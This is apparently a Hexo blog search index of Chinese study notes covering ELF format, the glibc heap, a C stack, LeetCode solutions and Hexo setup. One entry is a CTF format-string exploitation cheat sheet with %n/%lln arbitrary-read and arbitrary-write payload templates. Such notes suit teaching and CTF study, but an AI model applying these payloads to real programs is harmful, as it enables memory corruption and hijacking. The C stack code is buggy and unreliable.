+<p>GCC -c  hello.c -o hello.o<br>GCC -c hello.s -o hello.o<br>1<br>2<br>4.链接阶段：分为静态链接和动态链接两种方式，默认使用动态链接，使用-static指定使用静态链接。将目标文件和依赖库进行链接，主要包括地址和空间分配、符号绑定、重定位等。</p>
+<p>GCC hello.o -o hello<br>1<br>两个常用命令:file和objdump<br>file 文件名：查看文件详细信息<br>objdump -sd hello -M intel：反汇编</p>
+<p>二、ELF文件格式<br>ELF(Executable and Linkable Format):可执行可链接格式，在Linux上运行，在&#x2F;usr&#x2F;include&#x2F;elf.h中定义。</p>
+<p>1.ELF文件类型<br>   可执行文件（.exec）<br>   可重定位文件（.rel）<br>   共享目标文件（.dyn）</p>
+<p>2.ELF文件结构<br>视角选择：<br>链接视角：通过节（Section）来进行划分，通常包含代码（.text）、数据（.data）、BSS（.bss）三种节；<br>运行视角：通过段（Segment）来进行划分。</p>
+<p>（1）ELF文件头<br>ELF文件头（ELF header）位于目标文件最开始的位置，包含整个文件的基本信息。</p>
+<p>readelf -h elfDemo.rel #查看elf文件头信息<br>1<br>注意：文件头中存在魔术字符（Magic）：7f 45 4c 46 即字符串“\177ELF”,可以通过搜索该字符确定内存映射地址。</p>
+<p>（2）节头表<br>节头表（Section header table）包含了目标文件中所有节的信息，记录了节的名字、长度、偏移、读写权限等信息。节头表的位置记录在文件头的e_shoff域中。</p>
+<p>readelf -S elfdemo.rel#查看目标文件节头表<br>1<br>注意：节头表对于程序运行不是必须的，因为它与程序内存和布局无关，是程序头表的任务，所以常有程序去除节头表，以增加反编译器的分析难度。</p>
+<p>（3）代码节（.text）<br>objdump -x -s -d elfDemo.rel #输出各节的内容<br>1<br>Contents of section .text部分是.text数据的十六进制形式，共0x4e个字节，最左边一列是偏移量，中间四列为内容，最右边一列为ASCII码形式。<br>Disassembly of section .text部分是反汇编结果。</p>
+<p>（4）数据节（.data）<br>保存以及初始化的全局变量和局部静态变量。<br>.rodata 保存只读数据，包含只读变量和字符串常量</p>
+<p>（5）BSS节（.bss）<br>用于保存未初始化的全局变量和局部静态变量，没有Contents属性，只是为变量预留了位置，因此该节的sh_offset域也就没有意义。</p>
+<p>（6）其他节<br>字符串表（.strtab）<br>用来表示符号名和节名，引用字符串表时只需给出字符徐磊在表中的偏移量即可</p>
+<p>字符串表的第一个和最后一个字符均为null字符，以确保所有字符串的开始和终止。</p>
+<p>符号表（.dynsym和.symtab）<br>.dynsym保存引用外部文件的符号，只在运行时被解析；<br>.symtab还保存了本地符号，用于调试和链接。<br>目标文件通过在该表中的索引值来使用该符号，索引值从0开始，但0的表项不具备实际意义，他表示未定义的符号。</p>
+<p>3.可执行文件的装载<br>当运行一个可执行文件时，首先要将该文件和动态链接库装载到 进程空间中，形成一个进程镜像。<br>每个进程都有独立的虚拟地址空间，这个空间如何布局是由记录在 段头表 中的程序头决定的。<br>ELF文件头的e_phoff域给出了段头表的位置。<br>通过</p>
+<p>readelf - l elefDemo.exec<br>1<br>可以看出一个段包含了一个或多个节，相当于对这些节按不同权限进行分组，使之可以同时装载多个节，从而节省资源。</p>
+<p>常见的段：<br>PT_LOAD类型段：用于描述可装载的节（动态链接的可执行文件则包含两个–将.data和.text分开存放）<br>PT_DYNAMIC动态段:包含动态链接库所必须的信息，如共享库列表、GOT表和重定位表等。<br>PT_NOTE类型段：保存了系统相关的附加信息，运行并不需要<br>PT_INTERP段：将位置和大小信息存放在一个字符串中，是对程序解释器的位置的描述。<br>PT_PHDR段；保存了程序头表本身的位置和大小</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈</title>
+    <url>/2023/06/23/%E6%A0%88/</url>
+    <content><![CDATA[<p>Java堆溢出</p>
+<p>原因：创建的对象的总容量超过了堆的最大容量。</p>
+<p>溢出类型：java.lang.OutOfMemoryError。</p>
+<p>解决方法：</p>
+<p>排查是因为内存溢出还是内存泄漏导致的：通过性能监测工具如jconsole，获取堆内存快照，查看导致溢出的对象是不是必要的，不是的话就是泄漏，是的话就是溢出。</p>
+<p>内存泄漏：查看导致溢出的对象的GC ROOTS引用链，根据引用链找到具体的内存泄漏的位置，进行修改。</p>
+<p>内存溢出：检查JVM的堆参数设置（-Xmx：JVM最大内存与-Xms：启动初始内存），看是否还有向上调整的空间；再从代码上检查是否有些对象的生命周期过长，或者存储上设计不合理等问题。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>数据结构代码</title>
+    <url>/2023/06/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<p>include&lt;stdio.h&gt;<br>include&lt;stdlib.h&gt;<br>define SIZE 100;<br>typedef struct sqstack{<br>    int *base;<br>    int *top;<br>    int stacksize;<br>}sqstack1;<br>int intstack(sqstack1 &amp;s){<br>    s.base &#x3D; (int *)malloc(100 * sizeof(int));<br>    if(!s.base)exit(0);<br>    s.top&#x3D;s.base;<br>    s.stacksize&#x3D;100;<br>    return 1;<br>}<br>void push(sqstack1 &amp;s,int e){<br>    if(s.top-s.base&gt;&#x3D;s.stacksize){<br>        s.base &#x3D; (int * )realloc(s.base,(s.stacksize+10) * sizeof(int));<br>        if(!s.base)exit(0);<br>        s.top &#x3D; s.base+s.stacksize;<br>        s.stacksize+&#x3D;10;<br>    }	<br>    <em>s.top++ &#x3D; e;<br>}<br>int pop(sqstack1 s,int e){<br>    if(s.top&#x3D;&#x3D;s.base)return 0;<br>    e&#x3D;</em>–s.top;<br>    return 1;<br>}<br>int main(){<br>    sqstack1 s;int e;<br>    intstack(s);<br>    scanf(“%d”,&amp;e);<br>    push(s,e); </p>
+<pre><code>printf(&quot;%d&quot;,s.top);
+
+return 0;
+</code></pre>
+<p>}</p>
+]]></content>
+      <categories>
+        <category>code</category>
+      </categories>
+      <tags>
+        <tag>code</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>堆</title>
+    <url>/2023/08/09/%E5%A0%86/</url>
+    <content><![CDATA[<p>堆:<br>在程序执行的过程中，由malloc申请的内存空间被称作chunk,而当程序申请的chunk被free时会被加入到相应的空闲管理列表(bin)中。<br>size_t:<br>在32位系统上是32位无符号整数(4bytes)，在64位系统上是64位无符号整数(8bytes)<br>pre_size:<br>前一个chunk块的大小，如果chunk_size的P位为1则pre_size无效，上个chunk可以使用pre_size的空间。（前一个chunk块的大小，指的是低地址的chunk）<br>size:<br>当前chunk的大小，chunk的大小必须是2<em>SIZE_SZ（size_t）的整数倍，如果不满足会被强制转换为2</em>SIZE_SZ的整数倍。<br>fd、bk指针:<br>chunk被分配后从fd开始是用户的数据，chunk未被分配时，fd指向前一个空闲chunk（指链表中的前一个，物理地址可能不相邻），bk指向后一个空闲chunk。<br>fd_nextsize:<br>指向前一个与当前chunk大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize:<br>指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。（fd_nextsize和bk_nextsize只有在large chunk时才需要考虑）<br>mem:<br>指的是用户数据的首地址，与chunk中间差了一个chunk header（也就是PREV_SIZE和SIZE，大小是2*SIZE_SZ）<br>Bin:<br>用户释放掉的 chunk 不会马上归还给系统，ptmalloc会统一管理 heap 和 mmap 映射区域中的空闲的chunk。在具体的实现中，ptmalloc 采用分箱式方法对空闲的chunk 进行管理。ptmalloc把空闲的堆分成四种，分别是fast bins，small bins，large bins，unsorted bin<br>相似大小的 chunk 会用双向链表链接起来。<br>fastbins:<br>glibc以单链表结构对其进行管理，且每个bin采取的是LIFO（后进先出，跟栈类似）的策略，即最近释放的chunk会被优先分配，同时fastbin中的chunk的P位设为1，不会进行合并操作。fastbin大小（注：以下的大小都为mem的大小，实际chunk的空间还要加上chunk_head（64位为16字节，32位为8字节）<br>Unsorted bins:<br>如果free的chunk块不在fastbins范围内，就会被乱序存放在unsorted bins内，即是未排序的bin，而Unsortedbins的作用是视作空闲 chunk 回归其所属（larg&#x2F;small) bin 之前的缓冲区。当用户申请(malloc)一个大于fastbin的chunk时，首先会遍历unsorted bin中的chunk，找到合适的chunk，这时再将其他不满足的chunk保存到small bin和large bin中也是顺便的事情。<br>small bin:<br>从16到504字节(64位系统的话是从32字节到1008字节)<br>Large bin:<br>在这63个large bins中，前32个large bin依次以64字节步长为间隔，即第一个large bin中chunk size为512~575字节，第二个large bin中chunk size为576 ~ 639字节。紧随其后的16个large bin依次以512字节步长为间隔；之后的8个bin以步长4096为间隔；再之后的4个bin以32768字节为间隔；之后的2个bin以262144字节为间隔；剩下的chunk就放在最后一个large bin中。如下表所示。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串</title>
+    <url>/2023/08/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
+    <content><![CDATA[<p>格式化字符串漏洞的成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：printf(“%s”, pad)，偷懒写成了：printf(pad)，此时就存在格式化字符串漏洞。</p>
+<p>方法：在pwn题中遇到格式化字符串漏洞时，我们一般会分两大步实现漏洞利用：第一步构造一个payload来寻找输入字符串到栈顶指针的偏移；第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;python3</p>
+<h1 id="格式化符号说明"><a href="#格式化符号说明" class="headerlink" title="格式化符号说明"></a>格式化符号说明</h1><p>%x 以十六进制打印，只能打印4字节，一般只用于32位<br>%p 打印目标地址，建议32位和64位都用这个<br>%s 打印地址内容<br>%c 打印单个字符<br>%hhn 写一字节<br>%hn  写两字节<br>%n   写四字节<br>%ln  32位写四字节，64位写八字节<br>%lln 写八字节</p>
+<p>#################### 32位</p>
+<h1 id="求偏移"><a href="#求偏移" class="headerlink" title="求偏移"></a>求偏移</h1><p>pad &#x3D; “aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p…”</p>
+<h1 id="泄露目标地址内容，假设偏移为offset"><a href="#泄露目标地址内容，假设偏移为offset" class="headerlink" title="泄露目标地址内容，假设偏移为offset"></a>泄露目标地址内容，假设偏移为offset</h1><h2 id="目标地址放前面"><a href="#目标地址放前面" class="headerlink" title="目标地址放前面"></a>目标地址放前面</h2><p>pad &#x3D; p32(target_addr)+”%{}$s”.format(offset).encode(“ISO-8859-1”)</p>
+<h2 id="目标地址放后面"><a href="#目标地址放后面" class="headerlink" title="目标地址放后面"></a>目标地址放后面</h2><p>pad &#x3D; “%{}$s”.format(offset+1).encode(“ISO-8859-1”)+p32(target_addr)</p>
+<h1 id="改写目标地址内容为value"><a href="#改写目标地址内容为value" class="headerlink" title="改写目标地址内容为value"></a>改写目标地址内容为value</h1><h2 id="目标地址放前面-1"><a href="#目标地址放前面-1" class="headerlink" title="目标地址放前面"></a>目标地址放前面</h2><p>pad &#x3D; p32(target_addr)+”%{}c%{}$n”.format(value-4, offset).encode(“ISO-8859-1”)</p>
+<h2 id="目标地址放后面，注意ljust补位的字符和offset-idx的位置要对应"><a href="#目标地址放后面，注意ljust补位的字符和offset-idx的位置要对应" class="headerlink" title="目标地址放后面，注意ljust补位的字符和offset+idx的位置要对应"></a>目标地址放后面，注意ljust补位的字符和offset+idx的位置要对应</h2><p>pad &#x3D; “%{}c%{}$n”.format(value, offset+3).ljust(4*3, “a”).encode(“ISO-8859-1”)<br>pad +&#x3D; p32(target_addr)<br>####################<br>#################### 64位</p>
+<h1 id="求偏移-1"><a href="#求偏移-1" class="headerlink" title="求偏移"></a>求偏移</h1><p>pad &#x3D; “aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p…”</p>
+<h1 id="泄露目标地址内容，目标地址只能放后面，假设偏移为offset"><a href="#泄露目标地址内容，目标地址只能放后面，假设偏移为offset" class="headerlink" title="泄露目标地址内容，目标地址只能放后面，假设偏移为offset"></a>泄露目标地址内容，目标地址只能放后面，假设偏移为offset</h1><p>pad &#x3D; “%{}$s”.format(offset+1).ljust(8, “a”).encode(“ISO-8859-1”)+p64(target_addr)</p>
+<h1 id="改写目标地址内容为value-1"><a href="#改写目标地址内容为value-1" class="headerlink" title="改写目标地址内容为value"></a>改写目标地址内容为value</h1><h2 id="目标地址只能放后面，注意ljust补位的字符和offset-idx的位置要对应"><a href="#目标地址只能放后面，注意ljust补位的字符和offset-idx的位置要对应" class="headerlink" title="目标地址只能放后面，注意ljust补位的字符和offset+idx的位置要对应"></a>目标地址只能放后面，注意ljust补位的字符和offset+idx的位置要对应</h2><p>pad &#x3D; “%{}c%{}$lln”.format(value, offset+3).ljust(8*3, “a”).encode(“ISO-8859-1”)<br>pad +&#x3D; p64(target_addr)<br>####################<br>求偏移：<br>在格式化字符串漏洞利用中，我们一般都是这样手动构造payload进行偏移求解的。<br>地址泄露：<br>  第一种，其实在上面求偏移的过程中，就可以实现地址泄露了，下面举个例子，一般泄露传入程序的第一个参数也就是该程序名本身的地址，这是一个位于栈上的地址，通过计算和存储当前函数返回地址栈指针的偏移，成功找到指向返回地址的栈指针，最后再利用后面的任意地址写修改此处的值，实现程序流程控制。<br>任意地址写：<br>  在不使用FmtStr类时，我们一般是这样来实现任意地址写的，%{number}c表示写入的数，%{index}$n表示以偏移index位置的值为地址写入，其中n写入四字节，hn写入两字节，hhn写入单字节</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第六周</title>
+    <url>/2023/10/22/%E7%AC%AC%E5%85%AD%E5%91%A8/</url>
+    <content><![CDATA[<p>贪心算法<br>取第一步后不断置换<br>int maxProfit(int* prices, int pricesSize) {<br>    if (pricesSize &lt;&#x3D; 0) {<br>        return 0;<br>    }</p>
+<pre><code>int maxProfit = 0;
+int minPrice = prices[0];
+
+for (int i = 0; i &lt; pricesSize; i++) &#123;
+    if (prices[i] &lt; minPrice) &#123;
+        minPrice = prices[i];
+    &#125; else &#123;
+        int currentProfit = prices[i] - minPrice;
+        if (currentProfit &gt; maxProfit) &#123;
+            maxProfit = currentProfit;
+        &#125;
+    &#125;
+&#125;
+
+return maxProfit;
+</code></pre>
+<p>}<br>bool canJump(int* nums, int numsSize){<br>    int max_reach &#x3D; 0; &#x2F;&#x2F; 最远可以到达的位置</p>
+<pre><code>for (int i = 0; i &lt; numsSize; i++) &#123;
+    // 如果当前位置不可达，直接返回False
+    if (i &gt; max_reach) &#123;
+        return false;
+    &#125;
+
+    // 更新最远可以到达的位置
+    max_reach = (i + nums[i] &gt; max_reach) ? (i + nums[i]) : max_reach;
+
+    // 如果最远可以到达的位置已经超过或等于最后一个下标，返回True
+    if (max_reach &gt;= numsSize - 1) &#123;
+        return true;
+    &#125;
+&#125;
+
+return true;
+</code></pre>
+<p>}<br>class Solution {<br>    public int jump(int[] nums) {<br>    int n &#x3D; nums.length;<br>    int[] dp &#x3D; new int[n]; &#x2F;&#x2F; dp[i] 表示跳到位置 i 的最小跳跃数</p>
+<pre><code>// 初始化 dp 数组
+Arrays.fill(dp, Integer.MAX_VALUE);
+dp[0] = 0; // 初始位置的最小跳跃数为 0
+
+for (int i = 0; i &lt; n; i++) &#123;
+    int maxJump = Math.min(i + nums[i], n - 1); // 当前位置可以跳到的最远位置
+    for (int j = i + 1; j &lt;= maxJump; j++) &#123;
+        dp[j] = Math.min(dp[j], dp[i] + 1); // 更新跳到 j 的最小跳跃数
+    &#125;
+&#125;
+
+return dp[n - 1];
+</code></pre>
+<p>}</p>
+<p>}</p>
+]]></content>
+      <tags>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第四周</title>
+    <url>/2023/10/10/%E7%AC%AC%E5%9B%9B%E5%91%A8/</url>
+    <content><![CDATA[<p>void merge(int* nums1, int nums1Size, int m, int* nums2, int nums2Size, int n) {<br>    int i &#x3D; m - 1;  &#x2F;&#x2F; 初始化指针 i，指向 nums1 的末尾<br>    int j &#x3D; n - 1;  &#x2F;&#x2F; 初始化指针 j，指向 nums2 的末尾<br>    int k &#x3D; m + n - 1;  &#x2F;&#x2F; 初始化指针 k，指向合并后的数组的末尾</p>
+<pre><code>// 从后向前合并两个数组
+while (i &gt;= 0 &amp;&amp; j &gt;= 0) &#123;
+    if (nums1[i] &gt;= nums2[j]) &#123;
+        nums1[k] = nums1[i];
+        i--;
+    &#125; else &#123;
+        nums1[k] = nums2[j];
+        j--;
+    &#125;
+    k--;
+&#125;
+
+// 处理 nums2 中剩余的元素
+while (j &gt;= 0) &#123;
+    nums1[k] = nums2[j];
+    j--;
+    k--;
+&#125;
+</code></pre>
+<p>}<br>int removeDuplicates(int* nums, int numsSize){<br>    if (numsSize &lt;&#x3D; 2) {<br>        return numsSize;<br>    }</p>
+<pre><code>int j = 2; // j用来记录不重复元素的位置
+
+for (int i = 2; i &lt; numsSize; i++) &#123;
+    if (nums[i] != nums[j - 2]) &#123;
+        nums[j] = nums[i];
+        j++;
+    &#125;
+&#125;
+
+return j;
+</code></pre>
+<p>}</p>
+<p>int removeDuplicates(int* nums, int numsSize){<br>    if (numsSize &lt;&#x3D; 2) {<br>        return numsSize;<br>    }</p>
+<pre><code>int j = 2; // j用来记录不重复元素的位置
+
+for (int i = 2; i &lt; numsSize; i++) &#123;
+    if (nums[i] != nums[j - 2]) &#123;
+        nums[j] = nums[i];
+        j++;
+    &#125;
+&#125;
+
+return j;
+</code></pre>
+<p>}</p>
+]]></content>
+      <tags>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网站建立</title>
+    <url>/2023/06/21/%E7%BD%91%E7%AB%99%E5%BB%BA%E7%AB%8B%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<p>1.搭建前的软件准备（git，node）<br>Git：官网下载：<a href="https://git-scm.com/">https://git-scm.com/</a><br>Node.js 官网下载：<a href="http://nodejs.cn/">http://nodejs.cn/</a><br>Sublime<br>2. 安装hexo，完成简单本地页面展示<br>进入cmd窗口输入指令：<br>npm install -g hexo-cli<br>初始化<br>hexo init<br>查看是否能启动成功<br>hexo s<br>3.将Hexo部署到Github<br>Github创建个人仓库<br>首先，需要有一个github账号。登上账号后建一个仓库：仓库名为你的用户名.github.io，<br>举例如下：<br>创建一个和你用户名相同的仓库，后面加.github.io，<br>只有这样，将来要部署到GitHub的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名.<br>生成ssh添加到Github<br>在Github上创建仓库完成之后，需要设置ssh免密登录<br>进行部署<br>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
+]]></content>
+      <tags>
+        <tag>web前端</tag>
+      </tags>
+  </entry>
+</search>
